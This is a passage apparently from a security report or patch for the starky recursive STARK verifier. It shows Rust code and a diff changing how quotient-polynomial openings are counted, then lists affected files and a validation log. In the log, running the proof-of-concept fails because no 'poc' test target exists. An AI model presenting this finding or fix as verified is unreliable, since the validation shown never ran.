     let proof = add_virtual_stark_proof::<F, S, D>(
         builder,
         stark,
         config,
         degree_bits,
         num_ctl_helper_zs,
         num_ctl_zs,
     );
     let public_inputs = builder.add_virtual_targets(S::PUBLIC_INPUTS);
     StarkProofWithPublicInputsTarget {
         proof,
         public_inputs,
     }
 }
 
 /// Adds a new `StarkProofTarget` to this circuit.
 pub fn add_virtual_stark_proof<F: RichField + Extendable<D>, S: Stark<F, D>, const D: usize>(
     builder: &mut CircuitBuilder<F, D>,
     stark: &S,
     config: &StarkConfig,
     degree_bits: usize,
     num_ctl_helper_zs: usize,
     num_ctl_zs: usize,
 ) -> StarkProofTarget<D> {
     let fri_params = config.fri_params(degree_bits);
     let cap_height = fri_params.config.cap_height;
 
     let num_leaves_per_oracle = once(S::COLUMNS)
         .chain(
             (stark.uses_lookups() || stark.requires_ctls())
                 .then(|| stark.num_lookup_helper_columns(config) + num_ctl_helper_zs),
         )
         .chain(
             (stark.quotient_degree_factor() > 0)
                 .then(|| stark.quotient_degree_factor() * config.num_challenges),
         )
         .collect_vec();
 
     let auxiliary_polys_cap = (stark.uses_lookups() || stark.requires_ctls())
         .then(|| builder.add_virtual_cap(cap_height));
 
     let quotient_polys_cap =
         (stark.constraint_degree() > 0).then(|| builder.add_virtual_cap(cap_height));
 
     StarkProofTarget {
         trace_cap: builder.add_virtual_cap(cap_height),
         auxiliary_polys_cap,
         quotient_polys_cap,
         openings: add_virtual_stark_opening_set::<F, S, D>(
             builder,
             stark,
             num_ctl_helper_zs,
             num_ctl_zs,
             config,
         ),
         opening_proof: builder.add_virtual_fri_proof(&num_leaves_per_oracle, &fri_params),
         degree_bits: builder.add_virtual_target(),
     }
 }
 
 fn add_virtual_stark_opening_set<F: RichField + Extendable<D>, S: Stark<F, D>, const D: usize>(
     builder: &mut CircuitBuilder<F, D>,
     stark: &S,
     num_ctl_helper_zs: usize,
     num_ctl_zs: usize,
     config: &StarkConfig,
 ) -> StarkOpeningSetTarget<D> {
+    let num_quotient_polys = stark.num_quotient_polys(config);
+
     StarkOpeningSetTarget {
         local_values: builder.add_virtual_extension_targets(S::COLUMNS),
         next_values: builder.add_virtual_extension_targets(S::COLUMNS),
         auxiliary_polys: (stark.uses_lookups() || stark.requires_ctls()).then(|| {
             builder.add_virtual_extension_targets(
                 stark.num_lookup_helper_columns(config) + num_ctl_helper_zs,
             )
         }),
         auxiliary_polys_next: (stark.uses_lookups() || stark.requires_ctls()).then(|| {
             builder.add_virtual_extension_targets(
                 stark.num_lookup_helper_columns(config) + num_ctl_helper_zs,
             )
         }),
         ctl_zs_first: stark
             .requires_ctls()
             .then(|| builder.add_virtual_targets(num_ctl_zs)),
-        quotient_polys: (stark.constraint_degree() > 0).then(|| {
-            builder.add_virtual_extension_targets(
-                stark.quotient_degree_factor() * config.num_challenges,
-            )
-        }),
+        quotient_polys: (num_quotient_polys > 0)
+            .then(|| builder.add_virtual_extension_targets(num_quotient_polys)),
     }
 }
 
 /// Set the targets in a `StarkProofWithPublicInputsTarget` to
 /// their corresponding values in a `StarkProofWithPublicInputs`.
 pub fn set_stark_proof_with_pis_target<F, C: GenericConfig<D, F = F>, W, const D: usize>(
     witness: &mut W,
     stark_proof_with_pis_target: &StarkProofWithPublicInputsTarget<D>,
     stark_proof_with_pis: &StarkProofWithPublicInputs<F, C, D>,
     pis_degree_bits: usize,
     zero: Target,
 ) -> Result<()>
 where
     F: RichField + Extendable<D>,
     C::Hasher: AlgebraicHasher<F>,
     W: WitnessWrite<F>,
 {
     let StarkProofWithPublicInputs {
         proof,
         public_inputs,
     } = stark_proof_with_pis;
     let StarkProofWithPublicInputsTarget {
         proof: pt,
         public_inputs: pi_targets,
     } = stark_proof_with_pis_target;
 
     // Set public inputs.
     for (&pi_t, &pi) in pi_targets.iter().zip_eq(public_inputs) {
         witness.set_target(pi_t, pi)?;
     }
 
     set_stark_proof_target(witness, pt, proof, pis_degree_bits, zero)
 }
 
 /// Set the targets in a [`StarkProofTarget`] to their corresponding values in a
 /// [`StarkProof`].
 pub fn set_stark_proof_target<F, C: GenericConfig<D, F = F>, W, const D: usize>(
     witness: &mut W,
     proof_target: &StarkProofTarget<D>,
     proof: &StarkProof<F, C, D>,
     pis_degree_bits: usize,
     zero: Target,
 ) -> Result<()>
 where
     F: RichField + Extendable<D>,
     C::Hasher: AlgebraicHasher<F>,
     W: WitnessWrite<F>,
 {
     witness.set_target(
         proof_target.degree_bits,
         F::from_canonical_usize(pis_degree_bits),
     )?;
     witness.set_cap_target(&proof_target.trace_cap, &proof.trace_cap)?;
     if let (Some(quotient_polys_cap_target), Some(quotient_polys_cap)) =
         (&proof_target.quotient_polys_cap, &proof.quotient_polys_cap)
     {
         witness.set_cap_target(quotient_polys_cap_target, quotient_polys_cap)?;
     }
 
     witness.set_fri_openings(
         &proof_target.openings.to_fri_openings(zero),
         &proof.openings.to_fri_openings(),
     )?;
 
     if let (Some(auxiliary_polys_cap_target), Some(auxiliary_polys_cap)) = (
         &proof_target.auxiliary_polys_cap,
         &proof.auxiliary_polys_cap,
     ) {
         witness.set_cap_target(auxiliary_polys_cap_target, auxiliary_polys_cap)?;
     }
 
     set_fri_proof_target(witness, &proof_target.opening_proof, &proof.opening_proof)
 }
 
 /// Utility function to check that all lookups data wrapped in `Option`s are `Some` iff
 /// the STARK uses a permutation argument.
 fn check_lookup_options<F: RichField + Extendable<D>, S: Stark<F, D>, const D: usize>(
     stark: &S,
     proof: &StarkProofTarget<D>,
     challenges: &StarkProofChallengesTarget<D>,
 ) -> Result<()> {
     let options_is_some = [
         proof.auxiliary_polys_cap.is_some(),
         proof.openings.auxiliary_polys.is_some(),
         proof.openings.auxiliary_polys_next.is_some(),
         challenges.lookup_challenge_set.is_some(),
     ];
     ensure!(
         options_is_some
             .iter()
             .all(|&b| b == stark.uses_lookups() || stark.requires_ctls()),
         "Lookups data doesn't match with STARK configuration."
     );
     Ok(())
 }
```

### Affected files
- `starky/src/stark.rs`
- `starky/src/recursive_verifier.rs`

### Validation output

```
error: no test target named `poc` in default-run packages
help: available test targets:
    lookup_constraints_lose_quotients
    security_harness
```
